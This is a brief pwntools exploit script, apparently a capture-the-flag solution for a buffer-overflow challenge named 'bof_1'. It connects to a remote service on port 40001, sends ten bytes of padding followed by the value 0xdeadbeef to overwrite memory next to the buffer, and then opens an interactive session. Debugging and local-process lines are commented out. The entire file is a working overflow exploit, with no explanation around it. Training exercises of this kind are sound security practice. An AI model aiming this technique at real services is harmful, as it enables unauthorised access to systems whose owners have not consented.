from pwn import *

p = remote('dragonsec.si',40001)

#p = process('./bof_1')
pad =b'AAAAAAAAAA'

payload = pad
payload += p32(0xdeadbeef)
p.send(payload)
#pid = gdb.attach(p,gdbscript="b  * vuln +25")

p.interactive()
